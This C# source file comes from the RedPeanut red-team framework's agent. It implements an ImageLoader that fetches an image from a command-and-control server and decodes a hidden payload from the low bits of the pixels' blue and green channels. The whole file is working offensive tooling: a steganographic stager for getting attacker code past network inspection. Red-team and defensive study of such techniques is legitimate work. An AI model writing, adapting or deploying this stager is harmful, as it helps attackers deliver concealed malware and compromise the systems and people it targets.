//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using static RedPeanutAgent.Core.Utility;

namespace RedPeanutAgent.ImageLoader
{
    class ImageLoader
    {
        public static byte[] Load(string baseurl, string rpaddress, string page, CookiedWebClient wc, string targetclass)
        {
            List<string> imagetags = GetImagesInHTMLString(page, targetclass);
            string s = imagetags.First();

            wc.Headers.Add(HttpRequestHeader.Referer, rpaddress);
            Stream imgstream = wc.OpenRead(baseurl + GetIdValue(s, "src"));
            return GetPayloadFromImage(imgstream, Int32.Parse(GetIdValue(s, "id")));
        }

        private static string GetIdValue(string imgtag, string prop)
        {
            string pattern = prop + @"=""([^""]*)""";
            return Regex.Match(imgtag, pattern).Groups[1].Value;
        }

        private static List<string> GetImagesInHTMLString(string htmlString, string targetclass)
        {
            List<string> images = new List<string>();
            string pattern = @"<(img) class=""" + targetclass + @""" \b[^>]*>";

            Regex rgx = new Regex(pattern, RegexOptions.IgnoreCase);
            MatchCollection matches = rgx.Matches(htmlString);

            for (int i = 0, l = matches.Count; i < l; i++)
            {
                images.Add(matches[i].Value);
            }

            return images;
        }

        private static byte[] GetPayloadFromImage(Stream imgfile, int payloadlength)
        {
            Bitmap g = new Bitmap(imgfile);

            int width = g.Size.Width;

            int rows = (int)Math.Ceiling((decimal)payloadlength / width);
            int array = (rows * width);
            byte[] o = new byte[array];

            int lrows = rows;
            int lwidth = width;
            int lpayload = payloadlength;

            for (int i = 0; i < lrows; i++)
            {
                for (int x = 0; x < lwidth; x++)
                {
                    Color pcolor = g.GetPixel(x, i);
                    o[i * width + x] = (byte)(Math.Floor((decimal)(((pcolor.B & 15) * 16) | (pcolor.G & 15))));
                }
            }

            //o contain payload
            byte[] otrue = new byte[lpayload];
            Array.Copy(o, otrue, lpayload);

            return otrue;
        }
    }
}
